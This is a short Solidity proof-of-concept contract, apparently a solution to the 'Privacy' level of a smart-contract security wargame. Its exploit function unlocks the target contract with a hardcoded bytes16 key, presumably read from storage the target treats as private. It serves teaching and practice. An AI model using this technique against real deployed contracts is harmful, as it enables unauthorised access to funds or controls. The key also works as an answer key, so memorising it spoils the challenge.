// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./privacy.sol";

contract PrivacyPoc {
    Privacy privacy;

    constructor(address _privacy) {
        privacy = Privacy(_privacy);
    }

    function exploit() public {
        privacy.unlock(bytes16(0x8de7238b78942005fea750232d184d0c));
    }
}